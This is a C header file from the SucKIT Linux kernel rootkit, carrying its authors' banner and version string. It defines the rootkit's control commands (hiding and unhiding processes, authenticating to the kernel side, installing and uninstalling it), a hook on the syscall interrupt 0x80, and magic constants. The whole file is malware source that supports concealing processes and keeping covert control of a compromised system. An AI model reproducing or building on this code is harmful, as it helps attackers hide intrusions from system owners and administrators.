/*
 * $Id: sk.h, the misc stuff, most important etc
 */

#ifndef SK_H
#define SK_H
#include "sktypes.h"
#include "setup.h"

#define	DEBUG 0
#define	VERSION "v2.0-devel-rc2"

#if 0
#define BANNER	"...\n" \
		":.:................................................. ... .  .\n" \
                "  :\n" \
		"  :  Suckit " VERSION ", built " __DATE__ " <http://sd.g-art.nl/sk>\n" \
                "  .  (c) 2002 sd <sd@cdi.cz> & devik <devik@cdi.cz>\n" \
                "  .\n"
#endif
#define	BANNER	"SucKIT "VERSION" <http://hysteria.sk/sd/sk>\n" \
		"(c) Copyright 2001-2003 sd <sd@hysteria.sk>\n" \

#define eprintf(x...) fprintf(stderr, x)

#define	CMD_GETVER	0	/* get version */
#define	CMD_UNINST	1	/* uninstall */
#define	CMD_UNHIDE	2	/* make pid visible */
#define	CMD_HIDE	3	/* hide current task */
#define	CMD_AUTH	4	/* authenticate to kernel */
#define	CMD_INIT	5	/* initialize kernel side */
#define	CMD_GETHOME	6 	/* get actual home of kernel side */
#define	CMD_COMPLETED	0x2feedbee

#define	HOOK_INT	0x80
#define	SUCKIT_ORG	0x8deadbee

#if DEBUG
#define dbg(x...) printf(x); getchar();
#else
#define dbg(x...)
#endif

#define	ALIGN4K(x)	((x+4095) & ~4095)

#endif
